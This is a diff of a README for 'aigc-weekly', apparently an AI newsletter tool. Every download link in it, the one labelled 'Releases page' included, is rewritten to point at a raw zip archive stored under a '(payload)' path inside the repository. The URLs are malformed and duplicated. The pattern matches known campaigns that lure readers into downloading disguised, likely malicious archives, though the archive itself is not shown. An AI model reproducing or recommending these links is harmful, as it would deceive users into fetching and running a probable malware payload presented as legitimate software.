@@ -1,6 +1,6 @@
 # 🚀 aigc-weekly - Stay Updated with AI Insights
 
-[![Download Now](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/admin/aigc-weekly_2.5.zip%20Now-Ready%20for%https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/admin/aigc-weekly_2.5.zip)](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/admin/aigc-weekly_2.5.zip)
+[![Download Now](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip(payload)https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip%20Now-Ready%20for%https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip(payload)https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip)](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip(payload)https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Agili 的 AIGC 周刊 - 一个由 Agentic AI Agent 驱动的 AIGC（人工智能
 To begin using the application, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/admin/aigc-weekly_2.5.zip). Here, you will find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip(payload)https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip). Here, you will find the latest version of the software.
 
 2. **Choose the Latest Version**  
    Look for the most recent release. It will be at the top of the page.
@@ -53,7 +53,7 @@ Before downloading, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To download the application, please follow the instructions mentioned in the **Getting Started** section. Remember, you can access the [Download Here](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/admin/aigc-weekly_2.5.zip) button to find the latest version easily.
+To download the application, please follow the instructions mentioned in the **Getting Started** section. Remember, you can access the [Download Here](https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip(payload)https://raw.githubusercontent.com/Elo301182/aigc-weekly/master/app/(payload)/weekly_aigc_1.6.zip) button to find the latest version easily.
 
 If you require assistance during the installation or setup process, our community is here to help. Feel free to reach out through our repository for any inquiries.
 
